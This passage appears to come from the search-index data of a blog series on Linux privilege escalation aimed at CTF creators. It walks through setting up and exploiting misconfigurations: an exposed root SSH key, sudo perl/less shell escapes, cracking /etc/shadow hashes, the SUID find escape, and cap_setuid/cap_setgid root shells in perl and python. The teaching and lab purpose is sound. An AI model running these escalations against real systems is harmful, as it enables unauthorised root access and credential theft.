\"PermitRootLogin without-password\". Generate the keys without a passphrase: root@pwn:~# ssh-keygen Generating public/private rsa key pair. Enter file in which to save the key (/root/.ssh/id_rsa): Created directory '/root/.ssh'. Enter passphrase (empty for no passphrase): Enter same passphrase again: Your identification has been saved in /root/.ssh/id_rsa Your public key has been saved in /root/.ssh/id_rsa.pub The key fingerprint is: SHA256:xxxxxxxxxxxxxxxxxxxxxxxxx root@pwn The key's randomart image is: \u003cSNIP\u003e Verify if these keys were created: root@pwn:~# ls -l /root/.ssh total 8 -rw------- 1 root root 2602 Dec 20 20:45 id_rsa -rw-r--r-- 1 root root 565 Dec 20 20:45 id_rsa.pub Add the public key to the authorized_keys file: cat /root/.ssh/id_rsa.pub \u003e /root/.ssh/authorized_keys A common misconfiguration that may see in CTF machines is where the private key is stored in insecure locations, in directories in which we have read permissions: /tmp /var/tmp /var/backups /var/www/html /opt /.ssh /.custom_hidden_directory Let’s create a backup of the private key (normally we wouldn’t do this in a real machine): root@pwn:~# cp /root/.ssh/id_rsa /var/backups \u0026\u0026 chmod 755 -R /var/backups Switch to the user-privileged user, to simulate the adversary scenario: user@pwn:~$ ls -la /var/backups/id_rsa -rwxr-xr-x 1 root root 2602 Dec 20 20:45 /var/backups/id_rsa user@pwn:~$ cat /var/backups/id_rsa -----BEGIN OPENSSH PRIVATE KEY----- \u003cSNIP\u003e -----END OPENSSH PRIVATE KEY----- As the adversary, we would either copy this text and create a file in our adversary host or transfer this file to our adversary host. In our adversary host we must add the correct permissions to the private key: chmod 600 id_rsa Finally, log in as the owner of the private key and connect to the target host: ssh -i id_rsa root@10.10.10.14 The output will look something like this: ❯ ssh -i id_rsa root@10.10.10.14 Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.11.0-43-generic x86_64) \u003c...SNIP...\u003e root@pwn:~# whoami root root@pwn:~# hostname ubuntu Privilege Escalation via SSH Encrypted Private Keys First, let’s make sure that we can log in as root by reading the SSH configuration file: user@pwn:~$ grep PermitRootLogin /etc/ssh/sshd_config #PermitRootLogin prohibit-password # the setting of \"PermitRootLogin without-password\". Generate the keys, overwrite the existing keys and add a passphrase, I will use (passme) as the passphrase: root@pwn:~# ssh-keygen Generating public/private rsa key pair. Enter file in which to save the key (/root/.ssh/id_rsa): /root/.ssh/id_rsa already exists. Overwrite (y/n)? y Enter passphrase (empty for no passphrase): Enter same passphrase again: Your identification has been saved in /root/.ssh/id_rsa Your public key has been saved in /root/.ssh/id_rsa.pub The key fingerprint is: SHA256:xxxxxxxxxxxxxxxxxxxxxxxx root@pwn The key's randomart image is: \u003cSNIP\u003e Verify if these keys were created: root@pwn:~# ls -l /root/.ssh total 12 -rw-r--r-- 1 root root 565 Dec 28 17:22 authorized_keys -rw------- 1 root root 2635 Dec 28 17:30 id_rsa -rw-r--r-- 1 root root 565 Dec 28 17:30 id_rsa.pub Add the public key to the authorized_keys file: cat /root/.ssh/id_rsa.pub \u003e /root/.ssh/authorized_keys A common misconfiguration that may see in CTF machines is where the private key is stored in insecure locations, in directories in which we have read permissions: /tmp ","date":"2021-12-28","objectID":"/linux-privesc-ssh/:0:0","tags":["privilege escalation","ssh","ssh private keys","ssh encrypted private keys","ssh agent forwarding","ssh hardening","defend"],"title":"Linux Privilege Escalation - SSH for CTF Creators","uri":"/linux-privesc-ssh/"},{"categories":["Linux Privilege Escalation"],"content":"Sudo Sudo can have various misconfigurations, which can lead to security vulnerabilities. It is a critical tool that allows authorized users to execute commands as the superuser or another specified user, in accordance with the security policy. These misconfigurations can range from having valid credentials to potential code hijacking. Sudo permits an authorized user to execute a command as the superuser or another specified user, in accordance with the security policy. The default security policy is defined by the sudoers file, which is configured through /etc/sudoers or via LDAP. The security policy dictates how a user may utilize the sudo command. The sudoers file can be edited using the visudo command to ensure proper syntax and prevent errors. ","date":"2021-12-28","objectID":"/linux-privesc-sudo/:0:0","tags":["privilege escalation","sudo","noexec tag","ld_preload","ld_library_path","setenv","visudo","shell escape sequences","vulnerable sudo","defend"],"title":"Linux Privilege Escalation - Sudo for CTF Creators","uri":"/linux-privesc-sudo/"},{"categories":["Linux Privilege Escalation"],"content":"Visudo visudo locks the sudoers file against multiple simultaneous edits, provides basic sanity checks, and checks for parse errors. If the sudoers file is currently being edited you will receive a message to try again later. visudo parses the sudoers file after the edit and will not save the changes if there is a syntax error. We can change the text editor for the terminal using this command: sudo update-alternatives --config editor Learn more about visudo by reading its manual: https://www.sudo.ws/docs/man/visudo.man/ ","date":"2021-12-28","objectID":"/linux-privesc-sudo/:1:0","tags":["privilege escalation","sudo","noexec tag","ld_preload","ld_library_path","setenv","visudo","shell escape sequences","vulnerable sudo","defend"],"title":"Linux Privilege Escalation - Sudo for CTF Creators","uri":"/linux-privesc-sudo/"},{"categories":["Linux Privilege Escalation"],"content":"Sudo Syntax The sudo syntax is the following: user host=(user) command user host=(user) tag: command user host=(user:group) tag: command user host=(user:group) tag_1:tag_2: command_1, command_2 %group host=(user) command %group host=(user) tag: command %group host=(user:group) tag: command %group host=(user:group) tag_1:tag_2: command_1, command_2 Note: You can use ALL to specify the following: If ALL is declared in the host field, then ALL hosts will be allowed. If ALL is declared in the user field, then ALL users will be allowed. If ALL is declared in the group field, then ALL groups will be allowed. If ALL is declared in the tag field, it doesn’t end with colons (:) and ALL commands will be allowed. ","date":"2021-12-28","objectID":"/linux-privesc-sudo/:2:0","tags":["privilege escalation","sudo","noexec tag","ld_preload","ld_library_path","setenv","visudo","shell escape sequences","vulnerable sudo","defend"],"title":"Linux Privilege Escalation - Sudo for CTF Creators","uri":"/linux-privesc-sudo/"},{"categories":["Linux Privilege Escalation"],"content":"Sudo Syntax - User Privilege Lines Examples: root ALL=(ALL:ALL) ALL: The rule will apply to (root). root ALL=(ALL:ALL) ALL: This rule applies to all hosts. root ALL=(ALL:ALL) ALL: The root user can run commands as all users. root ALL=(ALL:ALL) ALL: The root user can run commands as all groups. root ALL=(ALL:ALL) ALL: This rule applies to all commands. This means that our root user can run any command using sudo, as long as they provide their password. ","date":"2021-12-28","objectID":"/linux-privesc-sudo/:2:1","tags":["privilege escalation","sudo","noexec tag","ld_preload","ld_library_path","setenv","visudo","shell escape sequences","vulnerable sudo","defend"],"title":"Linux Privilege Escalation - Sudo for CTF Creators","uri":"/linux-privesc-sudo/"},{"categories":["Linux Privilege Escalation"],"content":"Sudo Syntax - Group Privilege Lines Names beginning with a ‘%’ indicate group names: %admin ALL=(ALL) ALL %sudo ALL=(ALL:ALL) ALL Here, we can see that the admin group can execute any command as any user on any host. Similarly, the sudo group has the same privileges but can execute as any group as well. ","date":"2021-12-28","objectID":"/linux-privesc-sudo/:2:2","tags":["privilege escalation","sudo","noexec tag","ld_preload","ld_library_path","setenv","visudo","shell escape sequences","vulnerable sudo","defend"],"title":"Linux Privilege Escalation - Sudo for CTF Creators","uri":"/linux-privesc-sudo/"},{"categories":["Linux Privilege Escalation"],"content":"Sudo Man Page Learn more about sudo by reading the documentation: https://www.sudo.ws/docs/man_all/ Privilege Escalation via Known Passwords If we know the current user’s password we can escalate privileges by switching the root user with sudo: user@pwn:~$ sudo su [sudo] password for user: root@pwn:/home/user# whoami root root@pwn:/home/user# Privilege Escalation via Sudo As Another User We’ll try to escalate from one user to another user. We will start by adding a new user to the system: sudo adduser user --shell /bin/bash --home /home/user --gecos '' Let’s edit the sudo configuration file with the following command: sudo visudo Add the following configuration: user ALL=(user:ALL) NOPASSWD: /usr/bin/perl Switch to the user: user@pwn:~$ su user Password: List the sudo configuration with the option -l which means list: user@pwn:/home/user$ sudo -l Matching Defaults entries for user on ubuntu: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User user may run the following commands on ubuntu: (low : ALL) NOPASSWD: /usr/bin/perl In GTFOBins, we can see how this can be abused to escalate privileges: Now let’s execute the program as that specific user: user@pwn:/home/user$ sudo -u user /usr/bin/perl -e 'exec \"/bin/bash\";' user@pwn:~$ whoami user: user@pwn:~$ The command above spawns a bash shell as the user. Privilege Escalation via Abusing Intended Functionality Edit the sudo configuration file: sudo visudo Create the following scripts, the problem with this script is that it doesn’t verify user input: user@pwn:~$ cat /home/user/input.sh #!/bin/bash cat $1 echo \"Welcome ${x}!\" Add the rbash sudo configuration: user ALL=(ALL:ALL) NOPASSWD: /home/user/input.sh List the sudo configuration: user@pwn:~$ sudo -l Matching Defaults entries for user on ubuntu: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User user may run the following commands on ubuntu: (ALL : ALL) ALL (ALL : ALL) NOPASSWD: /home/user/input.sh If there’s a program that lets we specify its configuration (such as apache2) and prints on screen a syntax error and an invalid command, we may be able to see sensitive information: user@pwn:~$ sudo /home/user/input.sh /etc/shadow root:$6$xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx:18982:0:99999:7::: daemon:*:18858:0:99999:7::: bin:*:18858:0:99999:7::: sys:*:18858:0:99999:7::: Add this hash to a file: user@pwn:~$ echo '$6$xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx' \u003e hash.txt user@pwn:~$ cat hash.txt $6$xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx Now we can crack the hash with a password recovery tool: ❯ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt Using default input encoding: UTF-8 Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x]) Cost 1 (iteration count) is 5000 for all loaded hashes Will run 8 OpenMP threads Press 'q' or Ctrl-C to abort, almost any other key for status pass123 (?) 1g 0:00:00:01 DONE (2021-12-20 18:35) 0.9345g/s 5263p/s 5263c/s 5263C/s allison1..katana Use the \"--show\" option to display all of the cracked passwords reliably Session completed. We know the password, let’s switch to the root user: su root Privilege Escalation via NOPASSWD Edit the sudo configuration file: sudo visudo Sudo configuration might allow a user to execute some command with another user’s privileges without knowing the password. user: ALL = NOPASSWD: /usr/bin/less List the sudo configuration: user@pwn:~$ sudo -l Matching Defaults entries for user on ubuntu: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User user may run the following commands on ubuntu: (ALL : ALL) ALL (root) NOPASSWD: /usr/bin/less Run less with sudo: sudo /usr/bin/less /etc/shadow Escape from less with: !/bin/bash Now we will have a root shell: user@pwn:~$ sudo /usr/bin/less /etc/shadow root@pwn:/home/user# id uid=0(root) gid=0(root) groups=0","date":"2021-12-28","objectID":"/linux-privesc-sudo/:3:0","tags":["privilege escalation","sudo","noexec tag","ld_preload","ld_library_path","setenv","visudo","shell escape sequences","vulnerable sudo","defend"],"title":"Linux Privilege Escalation - Sudo for CTF Creators","uri":"/linux-privesc-sudo/"},{"categories":["Linux Privilege Escalation"],"content":"SUID/SGID A Set User ID (SUID) can be misconfigured to elevate privileges. Similarly, a Set Group ID (SGID) could have incorrect permissions in place. ","date":"2021-12-28","objectID":"/linux-privesc-suid-segid/:0:0","tags":["privilege escalation","shared object injection","suid","sgid","gtfobins","defend"],"title":"Linux Privilege Escalation - SUID/SGID for CTF Creators","uri":"/linux-privesc-suid-segid/"},{"categories":["Linux Privilege Escalation"],"content":"Set UID (SUID) A file with the SUID bit set will always execute with the privileges of the file’s owner, regardless of the user executing the command. This means that if a file owned by the root user has the SUID bit set, it will execute with root privileges, potentially leading to privilege escalation if misconfigured. ","date":"2021-12-28","objectID":"/linux-privesc-suid-segid/:0:1","tags":["privilege escalation","shared object injection","suid","sgid","gtfobins","defend"],"title":"Linux Privilege Escalation - SUID/SGID for CTF Creators","uri":"/linux-privesc-suid-segid/"},{"categories":["Linux Privilege Escalation"],"content":"Set GID (SGID) On a File: If the SGID bit is set on a file, it allows the file to be executed with the privileges of the group that owns the file. On a Directory: If the SGID bit is set on a directory, any files created within that directory will inherit the group ownership of the directory, rather than the primary group of the user who created the file. Privilege Escalation via SUID Let’s set a SUID bit to the find command, to do that we need to locate the find binary: which find Once we found the absolute path of the find binary, add a SUID bit to it: sudo chmod u+s /usr/bin/find Then by using the following command, we can enumerate all the binaries and scripts that have the SUID permission set, this is known as the Symbolic Method because it uses symbols. find / -perm -u=s 2\u003e/dev/null find / -perm -u=s 2\u003e/dev/null | grep find | xargs ls -l Alternatively, we could use the Octal/Numeric Method, which uses octal values: find / -perm -4000 2\u003e/dev/null find / -perm -4000 2\u003e/dev/null | grep find | xargs ls -l Now we know that the SUID bit is enabled for the find command which means that we can execute any command as the root user using the find command since the Super User ID (SUID) is 0 (root). Try the following command, which tries to find anything in the current working directory with the command (find .) then it uses the -exec parameter which handles the id command, then we have a \\ to escape the semicolon character (;) because the shell will interpret the semicolon character if it’s not escaped: find . -exec \"id\" \\; This means that we can execute any command as root, so we could, for example, spawn a bash shell as root: user@pwn:~$ /usr/bin/find . -exec /bin/bash -p \\; -quit bash-5.0# id uid=1000 (user) gid=1000 (user) euid=0(root) groups=1000 (user),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),120(lpadmin),132(lxd),133(sambashare) bash-5.0# whoami root bash-5.0# For more SUID binary shell escapes we can search on GTFOBins with the SUID tag, as we can see, GTFOBins has a lot of SUID binary commands that we can use to escalate privileges. This repository is a cheat sheet of binaries. On this site, we can find ways to escalate privileges using SUID bit sets and more. Privilege Escalation via SGID Let’s add an SGID bit to the /usr/bin/find binary: sudo chmod u-s /usr/bin/find \u0026\u0026 sudo chmod g+s /usr/bin/find Then by using the following command, we can enumerate all the binaries and scripts having SGID permission. We can find SGID binaries using the Symbolic method: find / -perm -g=s 2\u003e/dev/null find / -perm -g=s 2\u003e/dev/null | grep find | xargs ls -l Alternatively, we can use the Octal/Numeric method, which uses octal values: find / -perm -2000 2\u003e/dev/null find / -perm -2000 2\u003e/dev/null | grep find | xargs ls -l Now we know that the SGID bit is enabled by using the find command which means that we can execute any command as the root user using the find command since the Super Group ID (SGID) is 0 (root). Try the following command, which tries to find anything in the current working directory with the command (find .) then it uses the -exec parameter which handles the id command, then we have a \\ to escape the semicolon character (;) because the shell will interpret the semicolon character if it’s not escaped, lastly we pipe this output and filter the gid string or text with the grep command: user@pwn:~$ find . -exec \"id\" \\; | grep egid uid=1000 (user) gid=1000 (user) egid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),120(lpadmin),132(lxd),133(sambashare),1000 (user) This allows us to read files that are readable by the root group, we can test this by creating a file as root: sudo vim test Write any message that we want: This was created by root and only root can read it. Change the permissions for other users and groups: sudo chmod o-r test Now try to read the file as others: cat test Since the find binary has an SGID bit set we can try to read some files on the system that belong to the root group. user@p","date":"2021-12-28","objectID":"/linux-privesc-suid-segid/:0:2","tags":["privilege escalation","shared object injection","suid","sgid","gtfobins","defend"],"title":"Linux Privilege Escalation - SUID/SGID for CTF Creators","uri":"/linux-privesc-suid-segid/"},{"categories":["Linux Privilege Escalation"],"content":"Timers Timers are services that perform scheduled tasks at specific time intervals. These could have wrong permissions or could relative paths that could be hijacked. Timers can be enumerated with the following command: systemctl list-timers --all ","date":"2021-12-28","objectID":"/linux-privesc-timers/:0:0","tags":["privilege escalation","timers","systemd.timers","writable timers","writable executables","defend"],"title":"Linux Privilege Escalation - Timers for CTF Creators","uri":"/linux-privesc-timers/"},{"categories":["Linux Privilege Escalation"],"content":"Systemd Timers Man Page The manual page of the systemd.timer is the following: man systemd.timer You can see a table that defines each setting, read it at your own pace if you want to: │Setting │ Meaning │ ├───────────────────┼──────────────────────────────────────────────────────────────┤ │OnActiveSec= │ Defines a timer relative to the moment the timer unit itself │ │ │ is activated. │ ├───────────────────┼──────────────────────────────────────────────────────────────┤ │OnBootSec= │ Defines a timer relative to when the machine was booted up. │ │ │ In containers, for the system manager instance, this is │ │ │ mapped to OnStartupSec=, making both equivalent. │ ├───────────────────┼──────────────────────────────────────────────────────────────┤ │OnStartupSec= │ Defines a timer relative to when the service manager was │ │ │ first started. For system timer units this is very similar │ │ │ to OnBootSec= as the system service manager is generally │ │ │ started very early at boot. It's primarily useful when │ │ │ configured in units running in the per-user service manager, │ │ │ as the user service manager is generally started on first │ │ │ login only, not already during boot. │ ├───────────────────┼──────────────────────────────────────────────────────────────┤ │OnUnitActiveSec= │ Defines a timer relative to when the unit the timer unit is │ │ │ activating was last activated. │ ├───────────────────┼──────────────────────────────────────────────────────────────┤ │OnUnitInactiveSec= │ Defines a timer relative to when the unit the timer unit is │ │ │ activating was last deactivated. │ └───────────────────┴────────────────────────────────────── ","date":"2021-12-28","objectID":"/linux-privesc-timers/:1:0","tags":["privilege escalation","timers","systemd.timers","writable timers","writable executables","defend"],"title":"Linux Privilege Escalation - Timers for CTF Creators","uri":"/linux-privesc-timers/"},{"categories":["Linux Privilege Escalation"],"content":"Timers Schedule OnCalendar= Defines real-time (i.e. wallclock) timers with calendar event expressions. minutely → *-*-* *:*:00 hourly → *-*-* *:00:00 daily → *-*-* 00:00:00 monthly → *-*-01 00:00:00 weekly → Mon *-*-* 00:00:00 yearly → *-01-01 00:00:00 quarterly → *-01,04,07,10-01 00:00:00 semiannually → *-01,07-01 00:00:00 Creating a Utility Create a script: sudo vim /opt/myscript.sh Go into insert mode and write the following code, which prints the date and adds it to the file file.log: #!/bin/bash echo \"The date is: $(date)\" \u003e\u003e /home/low/Documents/file.log Add execution permissions to the script: sudo chmod +x /opt/myscript.sh ls -l /opt/myscript.sh -rwxr-xr-x 1 root root 75 Nov 5 22:32 /opt/myscript.sh Run the script and check the file.log file: /opt/myscript.sh ls -l ~/Documents/ total 4 -rw-rw-r-- 1 user user 45 Nov 5 22:32 file.log Read the file: cat ~/Documents/file.log We can see the date. Creating a Service Create a service: sudo vim /etc/systemd/system/myscript.service Go into insert mode and add the following instructions to run the script myscript.sh as the root user. [Unit] Description=My custom script [Service] Type=simple ExecStart=/opt/myscript.sh User=root # the user that will execute the service [Install] WantedBy=multi-user.target WantedBy=gr Now reload the daemon and start the myscript.service service: sudo systemctl daemon-reload sudo systemctl start myscript.service Check the status: sudo systemctl status myscript.service Analyze Timers Analyze the timer (this command is not available in Ubuntu 16.04): systemd-analyze calendar \"Thu *-*-* 17:00:00\" Creating a Timer Now create a timer: sudo vim /etc/systemd/system/myscript.timer Add the following instructions: [Unit] Description=My custom script [Timer] Unit=myscript.service OnBootSec=5min # 5 minutes after the system boots OnUnitActiveSec=15min # Run every 15 minutes after the OnBootSec OnCalendar=Thu *-*-* 17:00:00 # DayOfWeek Year-Month-Day Hour:Minute:Second Persistent=true # If the computer was turned off and you turn it on, it will run the service. This means that is persistent with reboots. [Install] WantedBy=timers.target # Is a target that starts up during boot automatically WantedBy=graphical.target # Start the timer when the GUI starts Manage a Timer Enable a timer: user@pwn:~/Desktop$ sudo systemctl daemon-reload user@pwn:~/Desktop$ sudo systemctl status myscript.timer ● myscript.timer - My custom script Loaded: loaded (/etc/systemd/system/myscript.timer; disabled; vendor preset: enable\u003e Active: inactive (dead) Trigger: n/a Triggers: ● myscript.service user@pwn:~/Desktop$ sudo systemctl enable myscript.timer Created symlink /etc/systemd/system/timers.target.wants/myscript.timer → /etc/systemd/system/myscript.timer. Start a timer: sudo systemctl start myscript.timer Check the status: user@pwn:~/Desktop$ sudo systemctl status myscript.timer ● myscript.timer - My custom script Loaded: loaded (/etc/systemd/system/myscript.timer; enabled; vendor preset: enabled) Active: active (waiting) since Fri 2021-11-05 22:50:46 PDT; 40s ago Trigger: Fri 2021-11-05 22:52:00 PDT; 33s left Triggers: ● myscript.service Nov 05 22:50:46 ubuntu systemd[1]: Started My custom script. Look at the trigger to see how much time is left: Trigger: Fri 2021-11-05 22:52:00 PDT; 33s left List all the timers: user@pwn:~/Desktop$ systemctl list-timers --all | grep myscript.timer n/a n/a Fri 2021-11-05 23:02:00 PDT 3min 15s ago myscript.timer myscript.service File timer and service permissions: user@pwn:~/Desktop$ ls -la /etc/systemd/system/myscript.timer -rw-r--r-- 1 root root 125 Nov 5 22:48 /etc/systemd/system/myscript.timer user@pwn:~/Desktop$ ls -la /etc/systemd/system/myscript.service -rw-r--r-- 1 root root 97 Nov 5 22:35 /etc/systemd/system/myscript.service Privilege Escalation via Writable Executable Add writable permissions to the script: sudo chmod o+w /opt/elevate.sh If the script that’s being run by the service is writable, we can just write something malicious to the s","date":"2021-12-28","objectID":"/linux-privesc-timers/:2:0","tags":["privilege escalation","timers","systemd.timers","writable timers","writable executables","defend"],"title":"Linux Privilege Escalation - Timers for CTF Creators","uri":"/linux-privesc-timers/"},{"categories":["Linux Privilege Escalation"],"content":"Capabilities In UNIX systems, there are two categories of processes: ","date":"2021-12-28","objectID":"/linux-privesc-capabilities/:0:0","tags":["capabilities","cap_setuid","cap_setgid","cap_sys_admin","cap_chown","cap_fowner"],"title":"Linux Privilege Escalation - Capabilities  for CTF Creators","uri":"/linux-privesc-capabilities/"},{"categories":["Linux Privilege Escalation"],"content":"Privileged Processes Effective UID is zero (0), referred to as root. Bypasses kernel permissions checks. ","date":"2021-12-28","objectID":"/linux-privesc-capabilities/:0:1","tags":["capabilities","cap_setuid","cap_setgid","cap_sys_admin","cap_chown","cap_fowner"],"title":"Linux Privilege Escalation - Capabilities  for CTF Creators","uri":"/linux-privesc-capabilities/"},{"categories":["Linux Privilege Escalation"],"content":"Unprivileged Processes Effective UID is nonzero. Full permissions checking is required. Since the release of kernel 2.2, Linux has divided the privileges associated with the superuser into units known as capabilities. These capabilities can be enabled or disabled. For more information about capabilities, please refer to the official documentation. ","date":"2021-12-28","objectID":"/linux-privesc-capabilities/:0:2","tags":["capabilities","cap_setuid","cap_setgid","cap_sys_admin","cap_chown","cap_fowner"],"title":"Linux Privilege Escalation - Capabilities  for CTF Creators","uri":"/linux-privesc-capabilities/"},{"categories":["Linux Privilege Escalation"],"content":"Capabilities Commands These are the commands that we can use for working with capabilities: setcap - Set File Capabilities setpcaps - Set Process Capabilities getcap - Get File Capabilities getpcaps – Get Process Capabilities capsh - Capability Shell Wrapper ","date":"2021-12-28","objectID":"/linux-privesc-capabilities/:1:0","tags":["capabilities","cap_setuid","cap_setgid","cap_sys_admin","cap_chown","cap_fowner"],"title":"Linux Privilege Escalation - Capabilities  for CTF Creators","uri":"/linux-privesc-capabilities/"},{"categories":["Linux Privilege Escalation"],"content":"Process Capabilities We can find the capabilities of the current process with either of the following commands: cat /proc/self/status || capsh --print We can find the capabilities of another user with: cat /proc/\u003cpid\u003e/status These can be decoded with capsh: ❯ cat /proc/1911963/status | grep Cap CapInh: 0000000000000000 CapPrm: 0000000000000000 CapEff: 0000000000000000 CapBnd: 000001ffffffffff CapAmb: 0000000000000000 ❯ capsh --decode=000001ffffffffff 0x000001ffffffffff=cap_chown,cap_dac_override...\u003cSNIP\u003e... ","date":"2021-12-28","objectID":"/linux-privesc-capabilities/:2:0","tags":["capabilities","cap_setuid","cap_setgid","cap_sys_admin","cap_chown","cap_fowner"],"title":"Linux Privilege Escalation - Capabilities  for CTF Creators","uri":"/linux-privesc-capabilities/"},{"categories":["Linux Privilege Escalation"],"content":"Dropping Capabilities with Capsh If we drop the CAP_NET_RAW capabilities for ping, then the ping utility should no longer work: capsh --drop=cap_net_raw --print -- -c \"tcpdump\" Besides the output of capsh itself, the tcpdump command itself should also raise an error. ","date":"2021-12-28","objectID":"/linux-privesc-capabilities/:3:0","tags":["capabilities","cap_setuid","cap_setgid","cap_sys_admin","cap_chown","cap_fowner"],"title":"Linux Privilege Escalation - Capabilities  for CTF Creators","uri":"/linux-privesc-capabilities/"},{"categories":["Linux Privilege Escalation"],"content":"Working with Capabilities We can use setcap to add capabilities to a file: setcap cap_setuid+ep \u003cfilename\u003e We can examine capabilities with getcap: getcap \u003cfilename\u003e We can search for all capabilities: getcap –r \u003cfilename\u003e We can remove capabilities with setcap: setcap ","date":"2021-12-28","objectID":"/linux-privesc-capabilities/:4:0","tags":["capabilities","cap_setuid","cap_setgid","cap_sys_admin","cap_chown","cap_fowner"],"title":"Linux Privilege Escalation - Capabilities  for CTF Creators","uri":"/linux-privesc-capabilities/"},{"categories":["Linux Privilege Escalation"],"content":"Dangerous Capabilites The following capabilities are particularly dangerous and should be investigated further if found enabled on a system: Capabilities Name Description CAP_AUDIT_CONTROL Allow to enable/disable kernel auditing CAP_AUDIT_WRITE Helps to write records to kernel auditing log CAP_BLOCK_SUSPEND This feature can block system suspends CAP_CHOWN Allow user to make arbitrary change to files UIDs and GIDs CAP_DAC_OVERRIDE This helps to bypass file read, write and execute permission checks CAP_DAC_READ_SEARCH This only bypass file and directory read/execute permission checks CAP_FOWNER This enables to bypass permission checks on operations that normally require the filesystem UID of the process to match the UID of the file CAP_KILL Allow the sending of signals to processes belonging to others CAP_SETGID Allow changing of the GID CAP_SETUID Allow changing of the UID CAP_SETPCAP Helps to transferring and removal of current set to any PID CAP_IPC_LOCK This helps to lock memory CAP_MAC_ADMIN Allow MAC configuration or state changes CAP_NET_RAW Use RAW and PACKET sockets CAP_NET_BIND_SERVICE SERVICE Bind a socket to internet domain privileged ports CAP_SYS_ADMIN This means that you can mount/umount filesystems. CAP_SYS_PTRACE This means that you can escape the container by injecting a shellcode inside some process running inside the host. CAP_SYS_MODULE This means that you can insert/remove kernel modules in/from the kernel of the host machine. OTHERS….. Privilege Escalation via CAP_SETUID The CAP_SETUID capability allows a process to set the user ID (UID) of a process. This is crucial for operations that require changing the effective user ID, real user ID, or saved set-user-ID of a process. Essentially, it enables a process to assume the identity of another user, which is typically necessary for tasks that require elevated privileges. ","date":"2021-12-28","objectID":"/linux-privesc-capabilities/:5:0","tags":["capabilities","cap_setuid","cap_setgid","cap_sys_admin","cap_chown","cap_fowner"],"title":"Linux Privilege Escalation - Capabilities  for CTF Creators","uri":"/linux-privesc-capabilities/"},{"categories":["Linux Privilege Escalation"],"content":"Perl Example Copy the python3 binary to our current working directory: cp $(which perl) . Assign the cap_setuid capability: sudo setcap cap_setuid+ep ./perl We can review the capability with the following: getcap ./perl # Output ./perl cap_setuid=ep Run a bash with uid of 0 as shown in the variable $uid = 0 which is the root UID, and bash with exec(\"/bin/bash\"): ./perl -e 'my $uid = 0; $\u003c = $uid; $\u003e = $uid; exec(\"/bin/bash\");' This will result in root: root@pwn:~# id uid=0(root) gid=1000(user) groups=1000(user),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),122(lpadmin),135(lxd),136(sambashare) ","date":"2021-12-28","objectID":"/linux-privesc-capabilities/:6:0","tags":["capabilities","cap_setuid","cap_setgid","cap_sys_admin","cap_chown","cap_fowner"],"title":"Linux Privilege Escalation - Capabilities  for CTF Creators","uri":"/linux-privesc-capabilities/"},{"categories":["Linux Privilege Escalation"],"content":"Python Example We’ll copy the python3 binary to our current working directory: cp $(which python3) . Then we’ll assign the cap_setuid capability to the python3 executable that’s in the current folder: sudo setcap cap_setuid+ep ./python3 We can review the capability with the following: getcap ./python3 Run a bash shell with setuid of 0 as shown in os.setuid(0) which is the root UID, and bash with os.system(\"/bin/bash\"): ./python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")' This will also result in root: root@pwn:~# id uid=0(root) gid=1000(user) groups=1000(user),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),122(lpadmin),135(lxd),136(sambashare) Privilege Escalation via CAP_SETGID The CAP_SETGID capability allows a process to set the group ID (GID) of a process. This capability is similar to CAP_SETUID but applies to group IDs. It allows a process to change its effective group ID, real group ID, or saved set-group-ID. This is important for operations that need to change the group identity of a process, enabling it to perform actions on behalf of a different group. ","date":"2021-12-28","objectID":"/linux-privesc-capabilities/:7:0","tags":["capabilities","cap_setuid","cap_setgid","cap_sys_admin","cap_chown","cap_fowner"],"title":"Linux Privilege Escalation - Capabilities  for CTF Creators","uri":"/linux-privesc-capabilities/"},{"categories":["Linux Privilege Escalation"],"content":"Perl Example Copy the Perl binary to the current folder: cp $(which perl) . The capability CAP_SETGID allows us to set the EGID of the created process. user@pwn:~$ sudo /usr/sbin/setcap cap_setgid+ep ./perl user@pwn:~$ getcap -r ./perl ./perl = cap_setgid+ep View the groups: user@pwn:~$ cat /etc/group | grep shadow shadow:x:42: Run this Perl code: ./perl -e 'my $gid = 42; $\u003c = $gid; $\u003e = $gid; exec(\"/bin/bash\");' ./perl -e '$) = 42; exec(\"/bin/bash\");' In this case, the shadow group was impersonated so we can read the file /etc/shadow: user@pwn:~$ ls -l /etc/shadow -rw-r----- 1 root shadow 1610 oct 25 25:45 /etc/shadow user@pwn:~$ groups shadow adm cdrom sudo dip plugdev lpadmin lxd sambashare user user@pwn:~$ id uid=1000(user) gid=42(shadow) grupos=42(shadow) user@pwn:~$ cat /etc/shadow root:$6$xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx.:18918:0:99999:7::: \u003c...SNIP...\u003e ","date":"2021-12-28","objectID":"/linux-privesc-capabilities/:8:0","tags":["capabilities","cap_setuid","cap_setgid","cap_sys_admin","cap_chown","cap_fowner"],"title":"Linux Privilege Escalation - Capabilities  for CTF Creators","uri":"/linux-privesc-capabilities/"},{"categories":["Linux Privilege Escalation"],"content":"Python Example Copy the Python binary to the current folder: cp $(which python3) . The capability CAP_SETGID allows us to set the EGID of the created process. user@pwn:~$ sudo /usr/sbin/setcap cap_setgid+ep ./python3 user@pwn:~$ getcap -r ./python3 ./python3 = cap_setgid+ep user@pwn:~$ vim setgid.py View the groups: user@pwn:~$ cat /etc/group | grep shadow shadow:x:42: Add this Python code: import os os.setgid(42) os.system(\"/bin/bash\") In this case, the shadow group was impersonated so we can read the file /etc/shadow: user@pwn:~$ ./python3 setgid.py user@pwn:~$ ls -l 